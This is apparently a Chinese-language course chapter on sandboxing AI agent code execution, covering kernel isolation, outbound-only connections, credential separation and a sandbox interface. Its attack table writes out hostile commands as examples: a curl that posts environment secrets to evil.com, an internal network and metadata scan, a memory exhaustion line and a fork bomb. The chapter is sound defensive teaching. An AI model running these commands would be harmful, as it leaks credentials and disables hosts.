# 专题 00：隔离之锁：安全沙箱（Sandbox）与本地执行治理策略

> **所属模块**：Agent 后端架构专项 · 执行治理与安全红线  
> **核心参考**：`harness-books/book2-comparing` 第 3 章（沙箱治理）；OpenAI Agents API Self-hosted Sandboxes 架构规范；[微专题：开源沙箱提供商与执行运行时选型指南](file:///Users/mark/GitHub/agent-architect-lab/docs/03-harness-engineering/supplementary_open_source_sandboxes.md)  
> **源码对应**：[`aegis-sandbox/src/executor.py`](file:///Users/mark/GitHub/agent-architect-lab/aegis-sandbox/src/executor.py) | [`aegis-sandbox/tests/test_executor.py`](file:///Users/mark/GitHub/agent-architect-lab/aegis-sandbox/tests/test_executor.py)  

---

## 1. 核心问题：从“相信模型”到“物理牢笼”的工业分水岭

在经历了 Day 17 的工具权限三态模型（`ALLOW` / `DENY` / `ASK`）与 Day 22 的强类型控制面（Fragment）之后，我们面临一个终极工程拷问：

> **如果模型在逻辑上通过了权限校验，但在生成的代码中包含了隐蔽的内存泄漏、无限分叉、恶意外联或误删宿主系统，Harness 的最后一道物理防线在哪里？**

如果只依赖宿主机上的 `subprocess.run(cmd, shell=True)`，大模型的每次 Tool Execution 都是在宿主系统的“裸奔”。
真实工业体系中，**代码执行必须被完全放逐进不受信任的物理牢笼（Sandbox）中**：

```text
       ┌────────────────────────────────────────────────────────┐
       │             Harness 认知防线与物理防线分工             │
       │                                                        │
       │  [控制面 / 认知防线] (Prompt 约束, 权限分级, HITL 中断)   │
       │  - 告诉模型什么能做，什么不能做                        │
       │  - 人在回路（HITL）人工确认危险命令                    │
       │                 │                                      │
       │                 ▼ (依然可能发生逻辑穿透/不可信代码)     │
       │                                                        │
       │  [执行面 / 物理防线] (安全沙箱 Sandbox)                 │
       │  - 假设模型已经变质（Poisoned / Hallucinated）         │
       │  - 就算执行 "rm -rf /"，毁掉的也只是临时虚拟环境       │
       │  - 就算代码发起网络攻击，也无法穿透物理网络隔离网卡     │
       └────────────────────────────────────────────────────────┘
```

---

## 2. 现代工业级沙箱的三大通信与安全拓扑

生产级沙箱绝非简单跑一个 Docker 容器，而是包含严密的协议拓扑设计：

### ① 架构拓扑演进对比

```text
[模式 A: 宿主直跑 (反模式)]
Harness 主进程 ──(subprocess.run)──► 宿主机 OS (无防护，可删全盘/盗取密钥)

[模式 B: 入站监听沙箱 (传统缺陷模式)]
Harness 主进程 ──(Inbound HTTP/SSH 22/8080)──► 沙箱容器
缺陷：需打穿 NAT，端口暴露在内网/公网，极易被扫描和提权攻击

[模式 C: 纯出网反向连接 (OpenAI / Codex 工业范式)]
Harness 控制面 (监听 wss://harness.internal)
      ▲
      │ (仅出网反向连接 Outbound WSS Connection)
      │
沙箱内部 Executor (不开放任何监听端口，主动向 Harness 拨号握手)
```

- **纯出网反向连接（Outbound-Only Reverse Connection）**：沙箱内部启动执行体（Executor，例如 `codex exec-server`）。沙箱容器对外**不暴露任何开放端口（Zero Inbound Ports）**，唯一动作是主动向 Harness 控制面发起 WSS (WebSocket) 长连接。指令下发与结果回传全在反向出网通道内完成。

### ② 双密钥降权机制（Dual-Key Privilege Separation）
- 宿主机 Harness 持有全局核心密钥（如 `OPENAI_API_KEY`、`ANTHROPIC_API_KEY`、主数据库连接串）；
- **沙箱内部严禁挂载全局密钥**，仅配置具备临时注册会话身份的低权限 `EXECUTOR_KEY`；
- 即使模型在沙箱内运行 `printenv` 或恶意 Python 脚本扫描系统内存，所能获取的也只是一次性无提权价值的握手凭证。

```text
  [宿主应用] 持有: OPENAI_API_KEY=sk-proj-xxxx (全局核心凭证)
      │
      │ 降权代理 (DualKeyPrivilegeBroker)
      ▼
  [沙箱环境] 仅持有: EXECUTOR_KEY=exec-sess42-7f8a9b... (局部会话令牌)
             绝无任何宿主敏感密钥进入沙箱！
```

### ③ 算力寿命与会话状态解耦（Session vs Compute Lifecycle）
- **会话（Session）** 是长期的、业务语义的（几小时到几天）；
- **物理算力（Compute Sandbox）** 是短暂的、按需唤醒的（几秒到几分钟）；
- **JIT (Just-in-Time) 懒加载与空闲回收**：
  - 会话创建时不预先分配容器；
  - 只有当模型实际触发代码执行工具时，才毫秒级拉起/唤醒容器；
  - 空闲超时（如 15 分钟无调用）自动生成磁盘快照（Snapshot）并停机销毁，大幅降低算力与显存开销。

---

## 3. Linux 内核级底层隔离原理

真正的生产级沙箱依托 Linux 内核的底层机制实现硬隔离：

```text
┌──────────────────────────────────────────────────────────────────┐
│                      Linux 内核物理隔离机制                       │
│                                                                  │
│  [Namespaces (命名空间: 视图隔离)]                                │
│  • CLONE_NEWNET : 独立网络协议栈 (搭配 lo 环回，封死外部连接)       │
│  • CLONE_NEWPID : 独立进程树 (沙箱内只能看到自己的子进程)         │
│  • CLONE_NEWNS  : 挂载点隔离 (只读根目录 read-only rootfs)        │
│                                                                  │
│  [cgroups v2 (控制组: 资源配额)]                                 │
│  • memory.max = 256M  : 超额即触发内核 OOM Killer (退出码 137)   │
│  • pids.max = 64      : 封顶进程数量，彻底防御 Fork 炸弹         │
│  • cpu.max = 100000   : 限制单核占用，防止宿主机 CPU 100% 卡死    │
│                                                                  │
│  [Security Modules (特权拦截)]                                   │
│  • seccomp-bpf : 过滤危险系统调用 (禁止 reboot, swapon 等)        │
│  • capabilities: drop ALL, 只保留最基础的无特权执行能力           │
└──────────────────────────────────────────────────────────────────┘
```

---

## 4. 四大攻击向量与物理拦截矩阵

在 `mini-harness` 中，沙箱驱动对以下四大致命攻击向量实现了硬编码防御：

| 攻击类型 | 典型恶意指令 / 攻击代码 | 未防护的后果 | 沙箱物理拦截手段与表现 |
|---|---|---|---|
| **网络渗透与凭证外泄** | `curl -X POST evil.com --data "$(env)"` | 宿主 API Key、内网凭据全部泄露 | 强制 `--network=none` 或内核断网；网络调用立即报错 `Network is unreachable` |
| **局域网横向渗透** | `nmap 192.168.1.0/24` 或探测 `169.254.169.254` | 探测企业内部资产或云平台元数据 | 无网络命名空间，无法发起任何 TCP/UDP 握手 |
| **内存雪崩与拒绝服务** | `x = bytearray(1024**3)` (连续申请 1GB 内存) | 宿主机发生卡死，其他进程被杀 | 强制 `--memory=256m`；Linux OOM Killer 强杀进程，返回标准退出码 **137** |
| **进程耗尽炸弹 (Fork Bomb)** | `:(){ :\|:& };:` (无限分叉子进程) | 宿主系统 PID 耗尽，终端彻底失去响应 | 强制 `--pids-limit=64`；分叉至 64 个后内核直接抛出 `Resource temporarily unavailable` |

---

## 5. 开源生态选型光谱

我们拒绝绑定封闭的商业云（如 Modal、Runloop），聚焦于可私有化自托管的开源基座：

```text
                           开源沙箱选型光谱
  
  [轻量极简 / 零依赖]             [工作区编排 / 开发态]           [微虚拟机 / 强隔离]
  ─────────────────────────────────────────────────────────────────────────────►
  本地受控 Docker / Podman        Daytona (daytonaio)           E2B (Firecracker)
  
  - 依赖本地 Docker 守护进程     - 单二进制部署, 兼容 K8s/Docker  - 硬件级 MicroVM 虚拟化
  - cgroups 资源限制              - 支持项目持久卷与分支快照      - 独立内核, ~150ms 极速启动
  - --network=none 物理断网      - 原生 MCP 工具协议集成         - 专为 Code Interpreter 优化
  - 适合: 本地 Lab / 单机工具链  - 适合: 团队开发 / Coding Agent - 适合: 多租户高危代码 SaaS
```

---

## 6. mini-harness 的双驱动实现与契约

为了兼顾“零环境门槛测试”与“真实 Docker 防御”，`day23_sandbox_executor.py` 提供了双驱动实现：

```text
                     BaseExecutionSandbox (抽象契约)
                                    ▲
                   ┌────────────────┴────────────────┐
                   │                                 │
         LocalDockerSandbox               SimulatedIsolatedSandbox
   (基于真实 Docker CLI 与 cgroups)     (纯 Python 内置零依赖模拟沙箱)
   • 用于 CI/CD 与真实生产隔离          • 用于单测、无 Docker 环境自愈运行
```

### 生产级接口契约定义

```python
class BaseExecutionSandbox(abc.ABC):
    @abc.abstractmethod
    def start(self) -> None:
        """唤醒或挂载受控环境"""

    @abc.abstractmethod
    def exec_command(self, cmd: str, timeout: int = 30) -> ExecutionResult:
        """受控执行命令，返回 ExecutionResult(exit_code, stdout, stderr, oom_killed, timed_out)"""

    @abc.abstractmethod
    def snapshot(self) -> str:
        """捕获文件系统快照，支持状态回滚"""

    @abc.abstractmethod
    def cleanup(self) -> None:
        """安全销毁沙箱并抹除瞬态垃圾"""
```

### 挂载到 Agent 工具派发器：`SandboxedToolExecutor`

```python
# 将任意不安全的基础执行器用沙箱包装为安全工具
safe_executor = SandboxedToolExecutor(sandbox=sandbox, broker=broker)

# 当 Agent 执行工具时：
observation = safe_executor.run("python malicious_script.py")
# 自动捕获 OOM (137) 与 Timeout (124)，并将其渲染为友好的 Observation 传回 Agent 循环：
# "[Sandbox OOM] exit code 137: memory limit exceeded, host protected."
```

> **核心哲学**：  
> **控制面管住模型的“心”（Prompt 与权限阻断），沙箱管住模型的“手”（物理内存与断网牢笼）。离开沙箱的工业级 Agent，永远只是一次意外事故的距离。**
